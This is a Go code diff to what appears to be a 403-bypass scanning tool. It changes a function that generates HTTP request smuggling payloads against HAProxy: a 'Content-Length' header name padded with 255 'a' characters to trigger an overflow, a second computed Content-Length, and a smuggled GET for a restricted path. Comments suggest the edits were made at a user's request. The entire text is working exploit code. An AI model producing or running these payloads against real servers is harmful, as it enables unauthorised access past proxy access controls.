@@ -49,18 +49,22 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// Generate overflow pattern - using the exact pattern from the PoC
 	// 217 'a' characters is what's used in the public exploits
-	overflowPattern := "0" + strings.Repeat("a", 217)
+	// User has indicated their specific PoC uses a header name (Content-Length0...:) that totals 271 chars,
+	// implying 255 'a's after "Content-Length0".
+	overflowPattern := "0" + strings.Repeat("a", 255)
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
 		// Craft the smuggled request
-		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n",
+		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
 			path, publicPath, host)
 
-		// Properly calculate the content length dynamically:
-		// First line + "h:G" which is necessary for the request smuggling technique
-		firstLine := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
-		contentLength := len(firstLine) + 3 // +3 for "h:G"
+		// Properly calculate the content length dynamically for the *second* Content-Length header:
+		// This is specific to the exploit technique.
+		firstLineSmuggled := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)        // Path of the smuggled restricted resource
+		calculatedContentLengthForSecondHeader := len(firstLineSmuggled) + 3 // +3 for "h:G"
+
+		malformedHeaderName := "Content-Length" + overflowPattern + ":"
 
 		// Create payload with dynamically calculated Content-Length
 		job := BypassPayload{
@@ -73,20 +77,25 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			Body:         smuggledRequest,
 			Headers: []Headers{
 				{
-					Header: "Content-Length" + overflowPattern + ":", // Note the colon at the end
-					Value:  "0",
+					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
+					Value:  "",                  // Empty value, to be handled by BuildRawHTTPRequest
 				},
 				{
 					Header: "Content-Length",
-					Value:  fmt.Sprintf("%d", contentLength), // Dynamically calculated
+					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
+				},
+				{
+					Header: "Connection",
+					Value:  "close",
 				},
 			},
 		}
 
 		job.PayloadToken = GeneratePayloadToken(job)
 		allJobs = append(allJobs, job)
+		allJobs = append(allJobs, job) // Add the same job again as per user request
 	}
 
-	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) for %s", len(allJobs), targetURL)
+	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (doubled) for %s", len(allJobs), targetURL)
 	return allJobs
 }
